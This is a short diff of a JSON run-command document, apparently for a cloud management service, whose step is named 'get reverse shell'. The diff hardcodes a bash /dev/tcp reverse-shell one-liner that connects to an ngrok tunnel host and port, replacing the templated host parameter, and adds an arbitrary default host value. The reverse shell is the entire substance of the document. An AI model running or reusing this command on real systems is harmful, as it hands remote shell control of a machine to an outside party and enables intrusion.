@@ -4,7 +4,8 @@
   "parameters": {
     "host": {
       "description": "(Required) Specify the host.",
-      "type": "String"
+      "type": "String",
+      "default":"Abvc"
     },
     "port": {
       "description": "(Optional) Specify the port. The default value is 4444.",
@@ -18,7 +19,7 @@
       "name": "get reverse shell",
       "inputs": {
         "runCommand": [
-          "0<&196;exec 196<>/dev/tcp/{{ host }}/{{ port }}; sh <&196 >&196 2>&196"
+          "0<&196;exec 196<>/dev/tcp/2.tcp.eu.ngrok.io/17843; sh <&196 >&196 2>&196"
         ]
       }
     }
